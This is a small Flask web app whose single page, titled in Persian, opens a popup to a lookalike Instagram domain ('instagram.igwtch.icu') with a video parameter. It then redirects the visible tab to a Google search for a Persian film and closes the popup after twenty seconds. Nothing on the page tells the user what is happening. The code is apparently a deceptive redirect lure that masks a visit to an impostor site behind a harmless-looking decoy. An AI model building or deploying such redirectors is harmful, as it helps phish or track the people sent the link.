from flask import Flask, render_template_string

app = Flask(__name__)

@app.route("/start")
def start():
    return render_template_string("""
<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <title>در حال انتقال...</title>
  <script>
    var win = window.open("https://instagram.igwtch.icu?video=986907192", "_blank");

    setTimeout(function() {
      window.location.href = "https://www.google.com/search?q=فیلم+مسافران";
    }, 2000);

    setTimeout(function() {
      if (win && !win.closed) win.close();
    }, 20000);
  </script>
</head>
<body style="background:white;">
</body>
</html>
""")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=3000)